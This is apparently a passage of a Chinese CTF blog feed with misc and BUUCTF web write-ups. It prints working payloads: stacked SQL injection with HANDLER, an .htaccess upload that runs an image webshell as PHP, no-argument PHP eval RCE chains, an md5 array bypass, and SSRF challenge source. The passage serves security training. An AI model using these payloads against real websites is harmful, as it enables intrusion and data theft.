<p>大概就是要传一个72*72的图，欧氏距离和horse更近一点</p>
<p>解密exp如下,源自官方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">h = Image.open(<span class="string">'horse.png'</span>)</span><br><span class="line">d = Image.open(<span class="string">'deer.png'</span>)</span><br><span class="line">a,b = h.size</span><br><span class="line">h_pixels = []</span><br><span class="line">d_pixels = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        h_pixels.append(h.getpixel((x,y))//<span class="number">50</span>)</span><br><span class="line">        d_pixels.append(d.getpixel((x,y)))  </span><br><span class="line">plt.imshow(np.array(h_pixels).reshape(<span class="number">72</span>,<span class="number">72</span>))</span><br><span class="line">plt.show()</span><br><span class="line">plt.imshow(np.array(d_pixels).reshape(<span class="number">72</span>,<span class="number">72</span>))</span><br><span class="line">plt.show()</span><br><span class="line">res1_png = Image.new(<span class="string">'L'</span>,(a,b))</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        <span class="keyword">if</span> d_pixels[x+a*y] != <span class="number">0</span>:</span><br><span class="line">            res1_png.putpixel((x,y),d_pixels[x+a*y]<span class="number">-100</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res1_png.putpixel((x,y),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        res1_png.putpixel((x,y),res1_png.getpixel((x,y))+h_pixels[x+a*y]*<span class="number">33</span>)</span><br><span class="line">res1_png.save(<span class="string">'deer1.png'</span>)</span><br><span class="line">plt.imshow(res1_png)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>从deer开始随手改了几个像素点为horse同位置的数值，然后保存为deer1.png,base64提交一下<br><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>收到一大串base64，扔进<a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">cyberchef</a>解一下里面又有个base64，转图片得到flag。</p>
<h2 id="Barbar"><a href="#Barbar" class="headerlink" title="Barbar"></a>Barbar</h2><p>首先发现电脑端CQR和手机端扫描结果不一样,怀疑有隐藏信息</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>foremost分离文件</p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p><a href="https://yuanfux.github.io/zero-width-web/" target="_blank" rel="noopener">在线网站</a>零宽字节隐写,扫描出隐藏密码</p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>用该密码YcfVgMBUraXftwO6Cp92YBGAbyRyWNOO解压缩包得到</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>docx里暂无别的信息,选择先修二维码</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>队友修完后扫描结果为</p>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>修了个寂寞,于是倒回去继续看docx解码,在document.xml里发现base64图片</p>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>是个Aztec code,中国编码app扫出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">di`f&#123;e1c64e14db14c6bb8faabab5bd7be1dc&#125;</span><br></pre></td></tr></table></figure></p>
<p>再进行npiet解密<br><a href="http://www.bertnase.de/npiet/npiet-execute.php" target="_blank" rel="noopener">在线网站</a><br><figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>flag{f2d76g36fd16cbb6abaaf8db57cbd1ed}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[10.8 队内AWD小结]]></title>
      <url>/AWD/ckwd5ws5b0000d0ucgtu71rk7/</url>
      <content type="html"><![CDATA[<p>不安全的内容就算导出md也是不安全,火绒真严格,pdf真香</p>
<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="10_8_队内AWD小结.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> AWD </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF web练习5]]></title>
      <url>/ctf-writeup-web/ckwd5ws7e001rd0uc78i1dnv5/</url>
      <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><a href="http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn" target="_blank" rel="noopener">http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn</a></p>
<p>经测试是字符型注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>尝试联合查询,爆出了黑名单,先用show查着</p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<p>根据匹配,先闭合语句再进行查询<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show databases;#</span><br><span class="line">?inject=1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>看到明显的FlagHere表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show tables;show columns from FlagHere;show columns from words;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>在mysql里还能使用handler进行查询,具体使用<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">官方文档</a></p>
<p>handler…open语句将打开一个表,使其可以使用后续handler…read语句进行访问,该表对象未被其他会话共享,并且在会话调用handler…close或会话终止之前不会关闭</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{901a13f0-67cb-4dd5-b765-0d2c02c91e81}</p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><a href="http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn" target="_blank" rel="noopener">http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>过滤得很严,只能上传图片,但.htaccess也可以上传</p>
<p>传入.htaccess文件作为php解析器,使我们传入的图片马里包含的php语句生效</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>在用蚁剑连接时连接图片地址</p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>进到根目录获得flag</p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{29c63dce-7ee9-4f02-a809-c41bf114cd19}</p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><a href="http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn" target="_blank" rel="noopener">http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn</a></p>
<p>先dirmap扫个目录</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>看到有.git隐藏文件,用githack恢复</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//过滤伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//正则匹配,传参会被替换成NULL且语句的合法形式是a(b());</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//过滤了一些关键字</span></span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="方法一-利用常量函数"><a href="#方法一-利用常量函数" class="headerlink" title="方法一:利用常量函数"></a>方法一:利用常量函数</h3><p>无参RCE需要一些php自带常量的函数来构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir()) //首先想到的是输出目录,如何指定当前目录?</span><br><span class="line">?exp=print_r(scandir(current(localeconv()))) //current(localeconv())结合,输出本地数组的值</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>php里有个next()函数可以用来读取数组的下一位元素,但在这题中不能连续使用,因为不适用a(b())格式,可flag.php正巧在倒数第二位,所以可以先用array_reverse()将数组倒序再进行读取,根据代码注释采用highlight_file()进行输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{16bab8e9-4333-4ff6-9ca3-ef4b717467ad}</p>
<h3 id="方法二-利用session"><a href="#方法二-利用session" class="headerlink" title="方法二:利用session"></a>方法二:利用session</h3><p>这是看大佬博客发现的方法,payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
<p>首先需要理解session的工作原理</p>
<ol>
<li>首先使用session_start()函数进行初始化</li>
<li>当执行PHP脚本时，通过使用$_SESSION超全局变量注册session变量</li>
<li>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用</li>
</ol>
<p>而session_start()初始化的东西可以在cookie里使用默认值PHPSESSID或者php.ini中设定的session.name进行文件读取，如果读取到了这个cookie将会创建$_SESSION变量并从相应目录中读取文件，并将字符装入变量中；如果没读取到也会创建$_SESSION变量和session文件并返回值。</p>
<p>获取到session_start()的初始值后，session_id()可以用来获取session会话的id，在cookie里指定到flag.php后进行读取，再用show_source()进行输出。</p>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><a href="http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn" target="_blank" rel="noopener">http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">	$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">	<span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">	$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">	highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;Please input first</span><br></pre></td></tr></table></figure>
<p>主要进行了GET方面$gg和$id的md5判断,和POST方面的$passwd密码传参<br>直接数组绕过md5判断,数字加字母绕过密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=a&amp;id[]=b</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{9cada024-2b17-4a01-ad45-23871db3d3c9}</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><a href="http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn" target="_blank" rel="noopener">http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn</a></p>
<p>将代码进行排版,是个flask的框架</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          </span><br><span class="line">        <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>附带Hint: flag is in ./flag.txt<br>审计之:</p>
<ol>
<li>三个路由,index用来获取源码,geneSign用来生成md5,De1ta为挑战.</li>
<li>在 /De1ta 中使用 get 传参 param ,在 cookie 里用 action sign 去读取 flag.txt,其中param=flag.txt,action 中要含有 read 和 scan,且 sign=md5(secert_key + param + action)<h3 id="方法一-哈希拓展攻击"><a href="#方法一-哈希拓展攻击" class="headerlink" title="方法一:哈希拓展攻击"></a>方法一:哈希拓展攻击</h3></li>
</ol>
<p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">详细资料</a></p>
